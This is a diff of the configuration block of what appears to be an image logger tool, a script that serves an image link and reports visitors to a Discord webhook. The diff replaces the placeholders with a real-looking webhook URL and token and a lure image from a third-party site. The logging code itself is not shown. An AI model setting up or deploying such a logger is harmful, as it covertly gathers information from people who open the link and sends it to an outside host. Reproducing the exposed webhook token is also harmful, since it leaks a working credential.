@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://ptb.discord.com/api/webhooks/1445760676281712772/LXXC43g9tmQrD3KuOyAWKU79oS1z6QEZHuSXiZvOVAnd6N6halIMTO4AF3VX9KEtxVYn",
+    "image": "https://www.jo1jo.com/wp-content/uploads/%D9%84%D8%BA%D8%B2-%D9%83%D9%85-%D8%B9%D8%AF%D8%AF-%D8%A7%D9%84%D8%AD%D9%8A%D9%88%D8%A7%D9%86%D8%A7%D8%AA-%D9%81%D9%8A-%D8%A7%D9%84%D8%B5%D9%88%D8%B1%D9%87-1.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
